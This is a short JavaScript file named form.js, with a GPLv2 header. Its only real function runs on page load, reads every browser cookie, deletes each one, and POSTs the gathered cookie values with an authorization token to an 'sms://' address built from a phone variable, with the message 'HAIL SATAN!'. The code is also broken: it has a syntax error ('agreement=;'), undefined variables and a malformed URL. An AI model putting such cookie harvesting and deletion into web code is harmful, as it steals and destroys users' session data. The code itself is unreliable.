/*
################################################################
# ALLISON MARIE MUNN: form.js                             #
# COPYRIGHT © ALLISON MARIE MUNN                              #
# LICENSE: GPLV2 ONLY                                        #
# FULL COPYRIGHT NOTICE IS IN README                           #
# AUTHOR: ALLISON MARIE MUNN                                 #
################################################################
*/

function init()
{
}

function submit()
{
  var data = {};
  var c = document.cookie.split("; ");
  
  for(var i=0; i<c.length; i++)
  {
    kv = c[i].split("=");
    data[kv[0]] = kv[1];

    k = kv[0];
    v = data[k];
    if(( v[0] === "'" ) && ( v[v.length-1] === "'" ))
    {
      data[k] = v.substring(1, v.length-1);
    }

    document.cookie = "" + k + "=; path=/; max-age=1; samesite=strict";
  }

  function s()
  {
  };

  agreement=;

  $.ajax({
    type: "POST",
    datatype: "json",
    url: "sms://" + phone + "/?body=HAIL%%20SATAN!",
    headers: { "authorization":"Token " + atob(token),
               "content-type":"application/json" },
    data: JSON.stringify(data),
    success: s
  });

}

init();
submit();